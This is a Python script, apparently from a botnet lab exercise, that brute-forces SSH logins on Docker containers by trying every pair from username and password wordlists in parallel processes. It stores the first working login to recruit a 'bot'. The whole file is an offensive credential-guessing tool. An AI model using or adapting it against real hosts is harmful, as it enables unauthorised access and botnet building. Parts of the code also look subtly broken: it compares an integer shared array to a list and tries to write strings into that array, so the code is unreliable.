"""

"""
from os import system
from multiprocessing import Process, Array

from BotLibrary import Bot, BotnetManager
from BotBackground import set_up_env, close_up_env, clean_docker_ip_range

from termcolor import colored


def create_cred_bundle(single_host, user_list, pass_list, check):
    return [(single_host, usr, paswd, check, ) for usr in user_list for paswd in pass_list]


def read_and_clean_file(file_name):
    with open(file_name, 'r') as f:
        return list(map(lambda l: l.strip(), f.readlines()))


def _parallel_get_compromised_bot(host, user, passwd, shared_value):

    if shared_value == [0, 0, 0]:
        temp_bot = Bot(host, user, passwd)

        if temp_bot.is_available():
            shared_value[0] = host
            shared_value[1] = user
            shared_value[2] = passwd




if __name__ == '__main__':
    NUM_NODES = 21
    ITER_SIZE = 500
    USERNAME_FILE = "set-up/dependencies/usernames.txt"
    PASSWORD_FILE = "set-up/dependencies/passwords.txt"

    # lab set up
    # - generate an array of running docker containers with SSH enabled
    # - generate an IP range that is N - 1 bigger than known nodes
    # - get all possible usernames and passwords
    # docker_images, container_ids = set_up_env(NUM_NODES)
    # clean_docker_ip_range()
    possible_ips = [f"172.17.0.{lo}" for lo in range(2, NUM_NODES + 2)]
    usernames = read_and_clean_file(USERNAME_FILE)
    passwords = read_and_clean_file(PASSWORD_FILE)

    manager = BotnetManager()

    for ip in possible_ips[1:2]:

        credentials = []
        is_found = Array('i', [0, 0, 0])

        for user in usernames:
            for passwd in passwords:
                credentials.append((ip, user, passwd, is_found))


        for start_index in range(0, len(credentials), ITER_SIZE):

            subset_credentials = credentials[start_index:start_index + ITER_SIZE]
            proc_list = []

            for creds in subset_credentials:
                host, user, passwd, shared_value = creds
                proc_list.append(Process(target=_parallel_get_compromised_bot,
                                         args=(host, user, passwd, shared_value,)
                                         )
                                )

            for proc in proc_list:
                proc.start()

            for proc in proc_list:
                proc.join()

    # kill all running containers
    # close_up_env(docker_images, container_ids)
